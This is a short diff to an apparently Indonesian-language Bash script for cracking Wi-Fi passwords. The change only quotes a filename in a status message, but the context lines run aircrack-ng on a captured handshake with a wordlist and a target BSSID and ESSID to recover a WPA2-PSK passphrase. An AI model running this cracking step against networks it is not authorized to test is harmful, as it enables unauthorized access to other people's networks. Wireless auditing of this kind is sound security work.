@@ -380,7 +380,7 @@ function crack_passpharase(){
                                         echo "[-] File Wordlist '${file_wordlist}' tidak ditemukan." 
                                         continue
                                 fi
-                                echo "[*] Mengcrack WPA2/PSK passphrase menggunakan file Wordlist ${file_wordlist}..."
+                                echo "[*] Mengcrack WPA2/PSK passphrase menggunakan file Wordlist '${file_wordlist}'..."
                                 sleep 3
                                 aircrack-ng  -a2 "${path}-01.cap" -w "${file_wordlist}" -b "${bssid_target}" -e "${essid_target}"
                                 echo "[*] Proses crack WPA2/PSK passphrase selesai."
